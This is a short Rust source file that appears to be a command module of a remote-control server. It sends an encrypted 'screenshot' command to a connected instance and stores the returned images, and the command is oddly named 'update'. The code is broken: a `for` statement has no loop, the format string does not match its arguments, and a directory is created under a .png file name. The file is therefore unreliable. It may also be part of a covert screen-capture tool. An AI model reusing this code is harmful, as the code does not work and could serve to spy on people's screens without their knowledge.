use std::fmt::format;

use tokio::fs;

use crate::connector_server::instance::Instance;

#[derive(Debug, Clone)]

pub struct Screenshot {
    name: String,
}

impl Screenshot {
    pub fn new() -> Screenshot {
        Screenshot {
            name: "update".to_string(),
        }
    }
    pub fn get_name(&self) -> String {
        self.name.clone()
    }
    pub async fn run(&self, instance: &mut Instance) {
        instance
            .send_hybrid_encryption(
                instance.get_public_key().clone(),
                "screenshot".as_bytes().to_vec(),
            )
            .await;
        let number_of_screenshots = instance.accept_message().await.as_slice();
        for
        fs::create_dir_all(format!("{users}/{}/screenshot.png", "", instance.get_path()))
            .await
            .unwrap();
    }
}
